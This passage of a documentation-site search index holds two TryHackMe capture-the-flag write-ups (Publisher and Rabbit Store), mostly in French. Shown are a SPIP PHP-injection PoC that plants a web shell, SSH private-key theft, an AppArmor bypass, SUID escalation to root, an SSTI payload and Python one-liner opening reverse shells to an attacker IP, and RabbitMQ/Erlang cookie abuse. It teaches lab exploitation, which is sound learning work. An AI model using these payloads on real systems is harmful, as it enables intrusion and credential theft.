permet \u00e0 un attaquant d'ex\u00e9cuter du code arbitraire sur un p\u00e9riph\u00e9rique distant.  Il existe un PoC (Proof of Concept) qui exploite une injection de code PHP dans SPIP. La vuln\u00e9rabilit\u00e9 existe dans le param\u00e8tre \u00ab\u00a0oubli\u00a0\u00bb et permet \u00e0 un utilisateur non authentifi\u00e9 d\u2019ex\u00e9cuter des commandes arbitraires avec des privil\u00e8ges d\u2019utilisateur web. </p> <p>J'ai t\u00e9l\u00e9charg\u00e9 le code de la PoC et j'ai renomm\u00e9 le fichier avec la CVE : <pre><code>mv T\u00e9l\u00e9chargements\\51536.py CVE-2023-27372.py\n</code></pre> </p> <p>Pour l'utiliser, on doit faire la commande suivante : - <code>python CVE-2023-27372.py</code> pour faire l'ex\u00e9cution du code Python - <code>-u http://&lt;IP-cible&gt;/spip</code> option pour pr\u00e9ciser l'url avec l'ip de la cible  - <code>-c</code> option pour pr\u00e9ciser la commande \u00e0 effectuer, entour\u00e9 de <code>' '</code>  - <code>'echo PD89YCRfR0VUWzBdYD8+|base64 -d &gt; shell.php'</code>  :</p> <p>Il faut faire t\u00e9l\u00e9charger \u00e0 la machine cible, un code en PHP pour transformer notre url vers le serveur web en terminal de commande : - On va convertir ce code PHP : <pre><code>&lt;?=`$_GET[0]`?&gt;\n</code></pre> - En base 64, avec CyberChef:  <pre><code>PD89YCRfR0VUWzBdYD8+\n</code></pre> </p> <p>Pourquoi en base64 ? Puisque le code PoC utilise d\u00e9j\u00e0 des guillemets dans la charge utile, il est possible d'utiliser base64 pour \u00e9viter d'\u00eatre confront\u00e9 \u00e0 ceux de notre shell inverse.</p> <ul> <li>Et, nous allons cr\u00e9er un fichier PHP avec cette base64, qu'on va d\u00e9coder avec l'option <code>-d</code> :  <pre><code>'echo PD89YCRfR0VUWzBdYD8+|base64 -d &gt; shell.php'\n</code></pre></li> </ul> <p>Enfin, on a la commande suivante : <pre><code>python CVE-2023-27372.py -u http://&lt;IP-cible&gt;/spip -c 'echo PD89YCRfR0VUWzBdYD8+|base64 -d &gt; shell.php'\n</code></pre>  Maintenant que l'on fait cette commande, nous pouvons taper cet url : <pre><code>http://&lt;IP-cible&gt;/spip/shell.php?0=&lt;cmd&gt;\n</code></pre></p> <p>J'ai commenc\u00e9 par analyser les fichiers pr\u00e9sents dans le r\u00e9pertoire utilisateur de la machine cible : <pre><code>http://&lt;IP-cible&gt;/spip/shell.php?0=ls -la ../..\n</code></pre> </p> <p>Et, on peut voir que l'utilisateur sur la machine est <code>think</code> et qu'il y a un fichier <code>user.txt</code> : <pre><code>http://&lt;IP-cible&gt;/spip/shell.php?0=ls -la ../../cat user.txt\n</code></pre> Voici le flag utilisateur !</p>"},{"location":"TryHackMe/Publisher%20CTF/Publisher%20CTF%20-%20TryHackMe/#ssh","title":"SSH","text":"<p>On doit maintenant, aller plus loin pour trouver le flag root qui doit s\u00fbrement n\u00e9cessit\u00e9 la recherche d'un terminal en root pour l'obtenir. On avais vu, au d\u00e9but avec le nmap, qu'il y avait un port pour le ssh donc je suis all\u00e9 voir si la connexion SSH est faisable par cl\u00e9 : <pre><code>http://&lt;IP-cible&gt;/spip/shell.php?0=ls -la ../../.ssh\n</code></pre> </p> <p>Et, on peut voir qu'il y a les deux cl\u00e9s (priv\u00e9 et public) rsa pour le SSH donc j'ai copi\u00e9 le contenu de la cl\u00e9 priv\u00e9 sur ma Kali : <pre><code>http://&lt;IP-cible&gt;/spip/shell.php?0=cat ../../.ssh/id_rsa\n</code></pre> </p> <p><pre><code>vim id_rsa\nhead id_rsa\n</code></pre>  Donc, nous allons pouvoir ce connect\u00e9 en SSH \u00e0 la machine cible sur l'utilisateur think et avec la cl\u00e9 priv\u00e9 : <pre><code>ssh think@&lt;IP-cible&gt; -i id_rsa\n</code></pre> </p> <p></p>"},{"location":"TryHackMe/Publisher%20CTF/Publisher%20CTF%20-%20TryHackMe/#escalade-de-privileges","title":"Escalade de privil\u00e8ges","text":"<p>Maintenant que nous sommes connect\u00e9 en SSH, nous allons devoir chercher un moyen, une faille nous permettant de faire une escalade de privil\u00e8ges afin de passer en root.</p> <p>Malheureusement, je n'ai pas pu faire t\u00e9l\u00e9charger sur la machine cible, le script LinPEAS avec les commandes suivantes :  <pre><code>## From github\ncurl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n## Without curl\npython -c \"import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')\"\n\npython3 -c \"import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')\"\n</code></pre></p> <p>Donc, j'ai fait cette commande manuelle qui va faire la m\u00eame chose :  Cette commande a pour but de rechercher les fichiers sur le syst\u00e8me qui ont le bit SUID (Set User ID) d\u00e9fini.  - <code>find /</code>: Lance la commande <code>find</code> \u00e0 partir de la racine du syst\u00e8me de fichiers (<code>/</code>). - <code>-type f</code>: Limite la recherche aux fichiers ordinaires (pas de r\u00e9pertoires, de liens symboliques, etc.). Le <code>-type f</code> sp\u00e9cifie que nous cherchons des fichiers. - <code>-perm -u=s</code>: Cherche des fichiers qui ont le bit SUID d\u00e9fini.  Le bit <code>SUID</code> permet \u00e0 un utilisateur d'ex\u00e9cuter un fichier avec les privil\u00e8ges du propri\u00e9taire de ce fichier. Par exemple, si un fichier est poss\u00e9d\u00e9 par l'utilisateur root et a le bit SUID d\u00e9fini, alors un utilisateur normal pourrait ex\u00e9cuter ce fichier avec les privil\u00e8ges root.</p> <ul> <li><code>2&gt;/dev/null</code>: Redirige les erreurs (descripteur de fichier 2) vers <code>/dev/null</code>, ce qui signifie que les messages d'erreur seront ignor\u00e9s. </li> </ul> <p><pre><code>find / -type f -perm -u=s 2&gt;/dev/null\n</code></pre> </p> <p></p> <p>Je suis interpell\u00e9 par le r\u00e9sultat <code>/usr/sbin/run_container</code> car cela signifie qu'il y a <code>Docker</code> install\u00e9 sur la machine cible et j'en ai la preuve : </p> <p>Je fais la commande strings pour afficher les cha\u00eenes de caract\u00e8res imprimables dans un fichier binaire ou non texte : <pre><code>strings /usr/sbin/run_container\n</code></pre> </p> <p> Le r\u00e9sultat nous affiche, en clair, le script shell : <code>/opt/run_container.sh</code> ce qui veut dire que ce fichier shell est utilis\u00e9 par le binaire du fichier <code>/usr/sbin/run_container</code>.</p> <p>Remarque : On peut voir que nous avons toutes les permissions (lire, \u00e9crire et ex\u00e9cuter) sur le dossier et du script mais pourtant, il est impossible de le modifier !</p> <p><pre><code>ls -la ../..\n</code></pre> <pre><code>ls -la /opt/run_container.sh\n</code></pre> </p>"},{"location":"TryHackMe/Publisher%20CTF/Publisher%20CTF%20-%20TryHackMe/#app-armor","title":"App Armor","text":"<p>Perdu devant ce probl\u00e8me, j'ai regard\u00e9 l'indice disponible sur la room, qui m'indique <code>App Armor</code> en recherchant sur Google, j'ai appris que c'est un\u00a0module de s\u00e9curit\u00e9 du noyau Linux, utiliser pour limiter les fonctionnalit\u00e9s des processus s'ex\u00e9cutant sur le syst\u00e8me d'exploitation h\u00f4te. </p> <p>Et que notre terminal n'est pas un <code>/usr/bin/bash</code> mais <code>/usr/sbin/ash</code>, v\u00e9rifiable avec la commande suivante : <pre><code>echo $SHELL\n</code></pre> </p> <p><pre><code>cat /etc/passwd\n</code></pre>  On peut voir que le compte root a un terminal en <code>/usr/bin/bash</code> et <code>think</code> a un terminal <code>/usr/sbin/bash</code> !</p> <p>Je suis all\u00e9 voir les r\u00e8gles sur les fichiers de App Armor et on peut bien voir que <code>usr.sbin.ash</code> est soumis \u00e0 des restrictions de lecture seule, qui fait \u00e9videmment r\u00e9f\u00e9rence \u00e0 notre terminal actuel : <pre><code>cd /etc/apparmor.d\nls -la\n</code></pre> </p> <p>Donc, regardons le contenu du fichier avec la commande suivante : <pre><code>cat usr.sbin.ash\n</code></pre> </p> <p>Et on peut voir que les permissions donn\u00e9es, nous emp\u00eache d'\u00e9crire dans le dossier <code>/opt</code>. </p> <p>Mais, en raison du <code>ix</code> sur <code>/usr/bin/** mrix</code> et <code>/usr/sbin/** mrix</code>, tout programme que nous ex\u00e9cutons qui se trouve dans ces chemins h\u00e9ritera \u00e9galement de cette politique. Il faut trouver un moyen de <code>bypass</code> la s\u00e9curit\u00e9 de App Armor pour obtenir un terminal classique.</p>"},{"location":"TryHackMe/Publisher%20CTF/Publisher%20CTF%20-%20TryHackMe/#shell-perl","title":"Shell - Perl","text":"<p>En recherchant sur Internet, j'ai trouv\u00e9 sur le site de HackTricks une m\u00e9thode permettant de contourner l\u2019App Armor et g\u00e9n\u00e9rer un terminal sans restrictions.</p> <p> Il nous explique qu'il y a un bug : que m\u00eame s'il y avait des r\u00e8gles qui emp\u00eache l'ex\u00e9cution de Perl avec certaines ressources, on peut toujours cr\u00e9er un fichier, sp\u00e9cifiant le shebang de Perl <code>##!/usr/bin/perl</code> afin que Perl l'interpr\u00e8te et qu'il nous cr\u00e9er un script shell !</p> <p>Voici les commandes et leur descriptions d\u00e9taill\u00e9s : 1. Cr\u00e9ation du script Perl : - <code>echo '##!/usr/bin/perl\\nexec \"/bin/sh\"' &gt; /dev/shm/test.pl</code> :    - <code>##!/usr/bin/perl</code> : C'est la ligne de shebang qui indique que le script doit \u00eatre ex\u00e9cut\u00e9 avec l'interpr\u00e9teur Perl.   - <code>\\n</code> : S\u00e9quence d'\u00e9chappement repr\u00e9sentant un saut de ligne.   - <code>exec \"/bin/sh\"</code> : Cette ligne de code Perl indique \u00e0 Perl d'ex\u00e9cuter <code>/bin/sh</code>, un shell.   - <code>&gt; /dev/shm/test.pl</code> : Redirige la sortie de <code>echo</code> vers le fichier <code>/dev/shm/test.pl</code>.</p> <p>Dans la m\u00e9thode pr\u00e9sent\u00e9 sur <code>HackTricks</code>, <code>App Armor</code> nous emp\u00eache d'\u00e9crire dans le dossier <code>/tmp</code>. Cependant, nous pouvons toujours \u00e9crire dans le dossier <code>/dev/shm</code>, qui est une m\u00e9moire partag\u00e9e temporaire (RAM), ou encore, dans le dossier <code>/var/tmp</code> est le r\u00e9pertoire utilis\u00e9 pour stocker des fichiers temporaires.</p> <ol> <li>Rendre le script ex\u00e9cutable :</li> <li> <p><code>chmod +x /dev/shm/test.pl</code> : Cette commande change les permissions du fichier <code>test.pl</code> pour le rendre ex\u00e9cutable.</p> </li> <li> <p>Ex\u00e9cution du script :</p> </li> <li><code>/dev/shm/test.pl</code> : Cette commande ex\u00e9cute le script Perl nouvellement cr\u00e9\u00e9.</li> <li>Lorsque ce script est ex\u00e9cut\u00e9, le shebang (<code>##!/usr/bin/perl</code>) dirige l'interpr\u00e9teur vers Perl.</li> <li>Ensuite, Perl ex\u00e9cute la commande <code>exec \"/bin/sh\"</code>, lan\u00e7ant ainsi un shell Unix.</li> </ol> <p><pre><code>echo -e '##!/usr/bin/perl\\nexec \"/bin/sh\"' &gt; /dev/shm/test.pl\nchmod +x /dev/shm/test.pl\n/dev/shm/test.pl\n</code></pre> </p> <p>En faisant cette commande, nous pouvons voir que nous sommes toujours connect\u00e9 en <code>think</code> dans ce nouveau terminal avec le <code>$</code> devant le terminal : <pre><code>whoami\n</code></pre></p>"},{"location":"TryHackMe/Publisher%20CTF/Publisher%20CTF%20-%20TryHackMe/#root","title":"Root","text":"<p>Maintenant que nous avons un terminal propre, nous allons repartir sur le script <code>/opt/run_container.sh</code> ayant le bit <code>SUID</code> pour pouvoir passer sur un terminal en <code>root</code>.</p> <p>Pour ce faire, nous allons remplacer le contenu de ce script <code>/opt/run_container.sh</code> pour qu'il ouvre un script en root. Je rappelle que nous avons tous les droit de le modifier (voir plus haut) et que rien ne nous en emp\u00eache dor\u00e9navant !</p> <p>Voici la commande et son descriptif : - <code>echo ##!/bin/bash</code> : La commande <code>echo</code> avec le shebang Bash. - <code>chmod +s /bin/bash</code> : Cette commande shell qui modifie les permissions du fichier <code>/bin/bash</code> en ajoutant le bit SUID (Set User ID), pour pouvoir \u00eatre en root ! - <code>&gt; /opt/run_container.sh</code> :  La sortie du <code>echo</code> qui va \u00e9cras\u00e9 le contenu du fichier. <pre><code>echo '##!/bin/bash\\n chmod +s /bin/bash' &gt; /opt/run_container.sh\n</code></pre> </p> <p>Maintenant, nous allons ex\u00e9cuter le <code>/usr/sbin/run_container</code>, qui va appel\u00e9 le script <code>/opt/run_container.sh</code> et qui va donc changer les permissions sur le dossier <code>/bin/bash</code> : <pre><code>/usr/sbin/run_container\nls -la /bin/bash\n</code></pre> </p> <p></p> <p>Enfin, nous allons terminer par la commande suivante, qui nous faire passer pour le compte root dans ce terminal car la commande <code>/bin/bash -p</code> lance un shell Bash avec les param\u00e8tres de privil\u00e8ge conserv\u00e9s (<code>root</code>) : <pre><code>/bin/bash -p\n</code></pre> </p> <p>Et en faisant cette commande, nous pouvons voir que nous sommes maintenant connect\u00e9 en tant que root ! <pre><code>whoami\n</code></pre> </p> <p>Dans ce nouveau terminal bash en root, avec <code>bash-5.0##</code> devant le terminal, nous trouvons  facilement le fichier <code>root.txt</code> contenant le dernier flag de la room : <pre><code>ls -la\ncat root.txt\n</code></pre> </p> <p>Voici le flag root !</p>"},{"location":"TryHackMe/Rabbit%20store/Rabbit%20store%20-%20TryHackMe/","title":"Rabbit store   TryHackMe","text":"<p>https://tryhackme.com/room/rabbitstore</p> <p></p> <pre><code>sudo nmap -sC -sV &lt;IP&gt;\n</code></pre> <p></p> <p></p> <p>HTTP : </p> <pre><code>curl &lt;IP&gt;\n</code></pre> <p></p> <pre><code>echo \"&lt;IP&gt; cloudsite.thm\" | sudo tee -a /etc/hosts &amp;&amp; curl http://cloudsite.thm\n</code></pre> <p></p> <p>OU</p> <p><pre><code>curl --resolve cloudsite.thm:80:&lt;IP&gt; http://cloudsite.thm\n</code></pre> </p> <pre><code>gobuster dir -u http://cloudsite.thm -w /usr/share/wordlists/dirb/big.txt -x php,html\n</code></pre> <p></p> <p></p> <p></p> <pre><code>gobuster dir -u http://storage.cloudsite.thm -w /usr/share/wordlists/dirb/big.txt -x php,html\n</code></pre> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <pre><code>\"subscription\": \"active\",\n</code></pre> <p></p> <p></p> <p></p> <p></p> <p></p> <pre><code>http://&lt;IP&gt;/test.txt\n</code></pre> <pre><code>gobuster dir -u http://storage.cloudsite.thm/api -w /usr/share/wordlists/dirb/common.txt\n</code></pre> <p></p> <p>TEST of SSRF vulnerability :</p> <p></p> <p></p> <p>Test with the domaine name</p> <p></p> <p></p> <p>Test directly with ip and the port 3000 (default of Express, visible on the X-Powered-By on the response) </p> <p></p> <p></p> <p>We discovered a new api url : </p> <pre><code>/api/fetch_messeges_from_chatbot\n</code></pre> <p>RCE via SSTI :</p> <pre><code>Content-Type: application/json;charset=UTF-8\n\n{\n    \"\":\"\"\n}\n</code></pre> <p></p> <pre><code>Content-Type: application/json;charset=UTF-8\n\n{\n    \"username\":\"admin\"\n}\n</code></pre> <p></p> <p>A server side template injection is a vulnerability that occurs when a server renders user input as a template of some sort.</p> <p>polygot SSTI</p> <pre><code>{\"username\":\"${{&lt;%[%'\\\"}}%\\\\.\"}\n</code></pre> <p></p> <p>You might wonder why a\u00a0Node.js\u00a0application using the\u00a0Express\u00a0framework returns an error from the\u00a0Jinja2\u00a0templating engine, which is typically used with\u00a0Python. This is because the\u00a0Express\u00a0application forwards requests made to the\u00a0<code>/api/fetch_messeges_from_chatbot</code>\u00a0endpoint to an internal\u00a0Flask\u00a0application and returns its response.</p> <p></p> <pre><code>{\"username\":\"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc &lt;IP&gt; 4444 &gt;/tmp/f').read() }}\"}\n</code></pre> <p></p> <p></p> <p></p> <pre><code>find . -name user.txt\n</code></pre> <pre><code>find ~ -name root.txt\n</code></pre> <p></p> <pre><code>98d3a30fa86523c580144d317be0c47e\n</code></pre> <p>Root :</p> <pre><code>cat /etc/passwd\n</code></pre> <p></p> <p>SUID :</p> <pre><code>find / -type f -perm -4000 2&gt;/dev/null\n</code></pre> <p></p> <p>Linpeas : </p> <p></p> <p></p> <p></p> <p></p> <p>Erlang :</p> <pre><code>cat /var/lib/rabbitmq/.erlang.cookie\n</code></pre> <p></p> <pre><code>git clone https://github.com/gteissier/erl-matter.git\n</code></pre> <p></p> <pre><code>chmod +x erl-matter/shell-erldp.py\n</code></pre> <p></p> <pre><code>./erl-matter/shell-erldp.py &lt;IP&gt; 25672 &lt;COOKIE&gt;\n</code></pre> <p></p> <p>Reverse Shell :</p> <pre><code>nc -lvnp 4444\n</code></pre> <p></p> <p><pre><code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"&lt;IP&gt;\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'\n</code></pre> </p> <p></p> <pre><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> <pre><code>chmod 600 .erlang.cookie\nrabbitmqctl add_user imposter 123\nrabbitmqctl set_user_tags imposter administrator\n</code></pre> <p></p> <p></p> <p>https://stackoverflow.com/questions/12792856/what-ports-does-rabbitmq-use</p> <p>PORT 4369\u00a0: Erlang utilise un d\u00e9mon de mappage de ports (epmd) pour la r\u00e9solution des noms de n\u0153uds dans un cluster. Les n\u0153uds doivent pouvoir se joindre les uns aux autres et au d\u00e9mon de mappage de ports pour que le clustering fonctionne. </p> <p>PORT 35197 : d\u00e9fini par inet_dist_listen_min/max Les pare-feu doivent autoriser le trafic dans cette plage \u00e0 passer entre les n\u0153uds en cluster</p> <p>Console de gestion RabbitMQ\u00a0:</p> <p>PORT 15672 pour RabbitMQ version 3.x PORT 55672 pour RabbitMQ pr\u00e9 3.x Assurez-vous que le plug-in rabbitmq_management est activ\u00e9, sinon vous ne pourrez pas acc\u00e9der \u00e0 la console de gestion sur ces ports.</p> <p>PORT 5672 Port principal de RabbitMQ (AMQP) PORT 5671 AMQP chiffr\u00e9 TLS (si activ\u00e9) Pour un cluster de n\u0153uds, ils doivent \u00eatre ouverts les uns aux autres sur 35197, 4369 et 5672.</p> <p>Pour tous les serveurs qui souhaitent utiliser la file d'attente de messages, seul 5672 (ou \u00e9ventuellement 5671) est requis.</p> <pre><code>curl -u \"imposter:123\" localhost:port http://localhost:15672/api/users\n</code></pre> <p></p> <p></p> <p>https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm</p> <p>En gros, \u00e7a ressemble \u00e0 \u00e7a :\u00a0base64(salt[4 bytes] + sha256(salt[4 bytes] + password))</p> <pre><code>#!/usr/bin/env python3\nimport hashlib  \nimport binascii  \n\n# Get the hash  \nuser_hash = \"&lt;base64_encoded_hash&gt;\"  \n# Convert the base64 encoded hash to binary  \npassword_hash = binascii.a2b_base64(user_hash)  \n# Convert the binary hash to a hexadecimal string  \ndecoded_hash = password_hash.hex()  \n# Split the decoded hash into two parts  \npart1 = decoded_hash[:8]  \npart2 = decoded_hash[8:]  \n\n# Print only the part2  \nprint(part2)\n</code></pre> <p></p> <pre><code>chmod +x script.py\n./script.py\n</code></pre> <p>C'est le mot de passe <code>root</code>, et non un hash !</p> <pre><code>su root\n</code></pre> <p></p> <pre><code>find / -type f -name \"root.txt\" 2&gt;/dev/null\n</code></pre> <pre><code>cat /root/root.txt\n</code></pre> <p></p>"}]}